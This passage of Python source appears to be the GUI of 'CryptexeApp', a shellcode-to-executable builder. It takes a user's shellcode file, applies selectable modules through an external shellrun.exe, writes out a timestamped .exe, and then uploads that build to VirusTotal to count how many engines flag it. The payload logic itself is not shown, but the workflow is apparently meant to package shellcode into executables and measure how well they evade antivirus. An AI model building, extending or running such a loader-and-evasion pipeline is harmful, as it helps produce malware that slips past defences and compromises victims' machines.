threading.Thread(target=work, daemon=True).start()    def _vt_start_scan(self, filepath=None):        key  = self.vt_key_entry.get().strip()        path = filepath or self.vt_file_entry.get().strip()        if not key:            self._vt_log("⚠  No API key — enter key first", "warn"); return        if not path or not Path(path).exists():            self._vt_log("⚠  Select a valid file first", "warn"); return        self.btn_vt_scan.configure(state="disabled", text="Uploading…")        self._vt_log(f"{'─'*52}", "dim")        self._vt_log(f"File    : {Path(path).name}", "blue")        sz = Path(path).stat().st_size // 1024        self._vt_log(f"Size    : {sz} KB", "dim")        with open(path, "rb") as f:            sha256 = hashlib.sha256(f.read()).hexdigest()        self._vt_log(f"SHA-256 : {sha256[:32]}…", "dim")        def work():            try:                existing = vt_get(key, f"/files/{sha256}")                if "error" not in existing:                    self.after(0, lambda: self._vt_poll_done(existing))                    return                self.after(0, lambda: self._vt_log("Uploading to VirusTotal…", "dim"))                result = vt_upload(key, path)                if "error" in result:                    msg = result.get("body", str(result["error"]))                    self.after(0, lambda: (                        self._vt_log(f"✗ Upload failed: {msg}", "err"),                        self.btn_vt_scan.configure(state="normal", text="⬆  Upload & Scan"),                    ))                    return                analysis_id = result.get("data", {}).get("id", "")                if not analysis_id:                    self.after(0, lambda: self._vt_log("✗ No analysis ID", "err"))                    self.after(0, lambda: self.btn_vt_scan.configure(state="normal", text="⬆  Upload & Scan"))                    return                self.after(0, lambda: self._vt_log("✓ Uploaded — polling…", "ok"))                self._vt_poll(key, analysis_id)            except Exception as e:                err = str(e)                self.after(0, lambda: self._vt_log(f"✗ {err}", "err"))                self.after(0, lambda: self.btn_vt_scan.configure(state="normal", text="⬆  Upload & Scan"))        threading.Thread(target=work, daemon=True).start()    def _vt_poll(self, key, analysis_id, attempts=0):        if attempts > 30:            self.after(0, lambda: self._vt_log("⚠ Timed out", "warn"))            self.after(0, lambda: self.btn_vt_scan.configure(state="normal", text="⬆  Upload & Scan"))            return        def work():            resp = vt_get(key, f"/analyses/{analysis_id}")            status = resp.get("data", {}).get("attributes", {}).get("status", "")            if status == "completed":                self.after(0, lambda: self._vt_poll_done(resp))            else:                dots = "." * ((attempts % 3) + 1)                self.after(0, lambda: self._vt_log(f"…  {status or 'queued'}{dots}", "dim"))                self.after(15000, lambda: self._vt_poll(key, analysis_id, attempts + 1))        threading.Thread(target=work, daemon=True).start()    def _vt_poll_done(self, resp):        self.btn_vt_scan.configure(state="normal", text="⬆  Upload & Scan")        stats = resp.get("data",{}).get("attributes",{}).get("last_analysis_stats",{})        malicious  = stats.get("malicious", 0)        suspicious = stats.get("suspicious", 0)        undetected = stats.get("undetected", 0)        total = malicious + suspicious + undetected + stats.get("harmless",0) + stats.get("timeout",0)        color = GREEN if malicious == 0 else (ORANGE if malicious <= 3 else RED)        self._vt_log(f"{'─'*52}", "dim")        self._vt_log(f"Result     : {malicious}/{total} detections", "ok" if malicious==0 else "err")        self._vt_log(f"Malicious  : {malicious}", "err" if malicious>0 else "ok")        self._vt_log(f"Suspicious : {suspicious}", "warn" if suspicious>0 else "ok")        self._vt_log(f"Undetected : {undetected}", "ok")        self._vt_log(f"{'─'*52}", "dim")        self.status_pill.configure(text=f"● VT: {malicious}/{total}", text_color=color)    # ── VT Upload from Builder ────────────────────────────────────────────────    def _do_vt_upload(self):        out = self.entry_out.get().strip()        if not out:            self._log("Select output directory first.", "err"); return        try:            candidates = list(Path(out).glob("*.exe"))        except Exception:            candidates = []        if not candidates:            self._log("No .exe found — build first.", "err"); return        latest = max(candidates, key=lambda p: p.stat().st_mtime)        self._log(f"Uploading to VT:  {latest.name}", "blue")        self.vt_file_entry.delete(0, "end")        self.vt_file_entry.insert(0, str(latest))        self._show("virustotal")        self._vt_start_scan(str(latest))    # ── Browse ────────────────────────────────────────────────────────────────    def _browse_sc(self):        from tkinter import filedialog        p = filedialog.askopenfilename(            title="Select Shellcode",            filetypes=[("Shellcode", "*.bin *.exe *.dll"), ("All", "*.*")],        )        if p:            self.entry_sc.delete(0, "end")            self.entry_sc.insert(0, p)            self._log(f"Shellcode: {Path(p).name}", "ok")    def _browse_out(self):        from tkinter import filedialog        p = filedialog.askdirectory(title="Output Directory")        if p:            self.entry_out.delete(0, "end")            self.entry_out.insert(0, p)            self._log(f"Output: {p}", "ok")    def _apply_preset(self, mods, label):        self._preset_mods = list(mods)        for mid, sw in self.mod_switches.items():            sw.select() if mid in mods else sw.deselect()        self._update_mod_count()        self._log(f"Preset  [{label}]  →  {' + '.join(mods)}", "blue")    # ── Build ─────────────────────────────────────────────────────────────────    def _do_build(self):        sc  = self.entry_sc.get().strip()        out = self.entry_out.get().strip()        if not sc:            self._log("Select a shellcode file first.", "err"); return        if not out:            self._log("Select an output directory first.", "err"); return        if not SHELLRUN_EXE.exists():            self._log(f"shellrun.exe not found: {SHELLRUN_EXE}", "err"); return        mods = self._preset_mods or [k for k, sw in self.mod_switches.items()                                      if sw.get() == "1"]        ts = time.strftime("%Y%m%d_%H%M%S")        exe_name = f"{Path(sc).stem}_{ts}.exe"        exe_path = Path(out) / exe_name        self._log(f"\n{'─'*52}", "dim")        self._log(f"Build started  [{time.strftime('%H:%M:%S')}]", "blue")        self._log(f"Shellcode : {Path(sc).name}", "ok")        self._log(f"Output    : {exe_path.name}", "ok")        self._log(f"Modules   : {' + '.join(mods)}", "blue")        self._log(f"{'─'*52}", "dim")        self.btn_build.configure(state="disabled", text="Building…")        self.progress.grid()        self.progress.set(0.05)        self.status_pill.configure(text="● Building…", text_color=ORANGE)        def work():            try:                args = [str(SHELLRUN_EXE), "-s", sc, "-o", out, "-n", exe_name]                for m in mods:                    args += ["-m", m]                env = os.environ.copy()                env["RUSTFLAGS"] = "-A warnings"                proc = subprocess.Popen(args, stdout=subprocess.PIPE,                                        stderr=subprocess.STDOUT, text=True, env=env)                out_text, _ = proc.communicate()                if proc.returncode == 0:                    pattern = os.path.join(out, "sc*", "target", "release", "*.exe")                    found = sorted(_glob.glob(pattern), key=os.path.getmtime, reverse=True)                    if found:                        src_exe = found[0]                        dst_exe = str(exe_path)                        shutil.copy2(src_exe, dst_exe)                        sc_tmp = os.path.dirname(os.path.dirname(os.path.dirname(src_exe)))                        shutil.rmtree(sc_tmp, ignore_errors=True)                self.after(0, lambda: self._build_done(proc.returncode, out_text, exe_path))            except Exception as e:                self.after(0, lambda: self._build_done(1, str(e), exe_path))        threading.Thread(target=work, daemon=True).start()    def _build_done(self, code, output, exe_path):        self.progress.set(1.0)        self.btn_build.configure(state="normal", text="▶  BUILD")        self.progress.after(600, self.progress.grid_remove)        for line in output.splitlines():            if not line.strip(): continue            lo = line.lower()            if "error" in lo and "warning" not in lo and "0 errors" not in lo:                tag = "err"            elif "[+]" in line or "finished" in lo or "done" in lo:                tag = "ok"            elif "[*]" in line or "[!]" in line or "warning" in lo or "[>]" in line:                tag = "warn"            else:                tag = "dim"            self._log(f"  {line.strip()}", tag)        if code == 0:            try:                candidates = list(exe_path.parent.glob("*.exe"))                found = max(candidates, key=lambda p: p.stat().st_mtime) if candidates else None            except Exception:                found = None            if found:                size = found.stat().st_size // 1024                self._log(f"\n✓ Built:  {found.name}  ({size} KB)", "ok")                self.status_pill.configure(text=f"● {found.name}", text_color=GREEN)            else:                self._log(f"\n✓ Build OK  (exit 0)", "ok")                self.status_pill.configure(text="● Build OK", text_color=GREEN)        else:            self._log(f"\n✗ Failed  (exit {code})", "err")            self.status_pill.configure(text="● Build failed", text_color=RED)    def _check_exe(self):        if not SHELLRUN_EXE.exists():            self._log(f"shellrun.exe not found — run:  cargo build --release", "warn")            self.exe_pill.configure(text="shellrun.exe not found", text_color=RED)        else:            self.exe_pill.configure(text="shellrun.exe ✓", text_color=GREEN)    def _log(self, msg, tag="ok"):        ts = time.strftime("%H:%M:%S")        self.log_box.insert("end", f"[{ts}] {msg}\n", tag)        self.log_box.see("end")    def _copy_log(self):        t = self.log_box.get("1.0", "end").strip()        if t:            self.clipboard_clear()            self.clipboard_append(t)    def _clear_log(self):        self.log_box.delete("1.0", "end")# ── Boot ──────────────────────────────────────────────────────────────────────if __name__ == "__main__":    CryptexeApp().mainloop()